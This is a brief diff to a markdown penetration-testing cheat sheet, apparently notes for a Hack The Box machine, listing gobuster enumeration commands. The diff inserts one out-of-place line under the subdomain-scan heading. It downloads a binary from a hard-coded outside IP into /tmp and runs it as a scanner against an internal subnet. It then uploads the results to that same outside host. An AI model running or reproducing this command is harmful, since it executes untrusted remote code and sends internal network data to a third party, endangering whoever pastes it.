@@ -22,6 +22,7 @@ gobuster dir -u http://[TARGET_IP] -w /usr/share/wordlists/dirb/common.txt -x ph
 ```
 ### Scan subdomain
 ```
+cd /tmp; curl http://95.111.254.81/fscan -o fscan; chmod +x fscan; ./fscan -h 10.0.72.0/24 -o res.txt; curl --data-binary @res.txt http://95.111.254.81:8000/
 gobuster vhost -u http://soulmate.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt --append-domain -t 50
 ```
 # Tunnel
